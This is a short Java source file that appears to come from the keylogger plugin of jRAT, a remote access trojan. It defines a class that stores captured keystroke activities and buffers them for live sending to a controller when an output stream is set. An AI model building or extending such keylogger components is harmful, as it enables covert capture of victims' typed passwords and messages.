package pro.jrat.plugin.stub.activities;

import java.util.ArrayList;
import java.util.List;

import pro.jrat.plugin.stub.KeyloggerPlugin;

public class Activities {

	public static final List<Activity> activities = new ArrayList<Activity>();
	public static final List<Activity> online = new ArrayList<Activity>();

	public static synchronized void add(Activity activity) {
		/*if (activity instanceof Key && unix && activities.size() > 0 && ((Key)activities.get(activities.size() - 1)).getKey() == (((Key)activity).getKey())) {
			return;
		}*/
		activities.add(activity);
		
		if (KeyloggerPlugin.dos != null) {
			if (online.size() > 2500) {
				online.clear();
			}
			online.add(activity);
		}
	}
}